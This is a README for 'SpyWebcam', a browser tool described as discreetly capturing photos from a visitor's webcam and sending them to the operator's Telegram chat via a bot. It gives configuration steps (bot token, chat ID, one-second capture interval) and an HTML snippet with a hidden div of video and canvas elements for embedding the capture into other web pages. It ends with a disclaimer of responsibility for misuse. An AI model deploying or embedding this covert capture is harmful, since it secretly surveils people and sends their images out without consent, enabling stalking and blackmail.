## SpyWebcam

SpyWebcam is a tool that discreetly captures photos from a user's webcam and sends them via Telegram using its bot API

### Config

1. Open the `config.js` file in a text editor

2. Add your bot's token, the chat_id the bot will send images to, and the capture interval
   ```javascript
   // Telegram bot token
   const TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";

   // Chat ID where the bot sends the images
   const CHAT_ID = "YOUR_CHAT_ID";

   // Interval in seconds
   const INTERVAL = 1;

### Integration

1. To use SpyWebcam in other projects, insert the code below into your HTML page and include the modules

    ```html
    <!-- Canvas div (include in your HTML page) -->
    <div style="display:none;">
        <video autoplay playsinline></video>
        <canvas width="600" height="600"></canvas>
    </div>

    <!-- Modules -->
    <script src="js/config.js"></script>
    <script src="js/webcam.js"></script>

2. Ensure that your HTML page is served over HTTPS (SSL) to enable webcam access in modern browsers

**Caution: I am not responsible for misuse of this tool**
